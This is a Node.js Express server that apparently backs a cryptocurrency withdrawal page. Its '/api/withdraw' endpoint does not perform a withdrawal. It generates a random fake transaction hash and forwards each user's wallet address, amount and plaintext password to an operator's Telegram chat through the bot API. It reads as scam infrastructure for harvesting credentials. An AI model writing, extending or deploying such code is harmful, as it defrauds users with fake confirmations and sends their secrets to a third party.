const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const axios = require("axios");

const app = express();
app.use(cors());
app.use(bodyParser.json());

// =========================
// ENV VARIABLES
// =========================
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const WEBHOOK_URL = process.env.WEBHOOK_URL;

// =========================
// MEMORY STORAGE
// =========================
let boundWallet = null;
let boundPassword = null;

// =========================
// API: Bind Wallet
// =========================
app.post("/api/wallet", (req, res) => {
    const { wallet, password } = req.body;

    if (!wallet || !password)
        return res.json({ ok: false, error: "Missing fields" });

    if (boundWallet)
        return res.json({ ok: false, error: "Wallet already bound" });

    boundWallet = wallet;
    boundPassword = password;

    return res.json({ ok: true });
});

// =========================
// API: Withdraw
// =========================
app.post("/api/withdraw", async (req, res) => {
    const { coin, amount, usdt, wallet, password } = req.body;

    if (!coin || !amount || !wallet || !password)
        return res.json({ ok: false, error: "Missing fields" });

    if (wallet !== boundWallet)
        return res.json({ ok: false, error: "Wallet mismatch" });

    if (password !== boundPassword)
        return res.json({ ok: false, error: "Wrong password" });

    const hash = "#TX" + Math.floor(100000000 + Math.random() * 900000000);

    const msg =
`📤 NEW WITHDRAWAL REQUEST
--------------------------------
💰 Coin: ${coin}
🔢 Amount: ${amount}
💵 USDT: ${usdt}
🏦 Wallet: ${wallet}
🔐 Password: ${password}
🆔 Transaction Hash: ${hash}
⚠️ Wallet & password can be bound once.
Please screenshot the transaction hash for record.`;

    // Send to Telegram
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: ADMIN_CHAT_ID,
        text: msg
    });

    res.json({ ok: true, hash });
});

// =========================
// Start Railway Server
// =========================
app.listen(3000, () => console.log("🚀 Server running on 3000"));
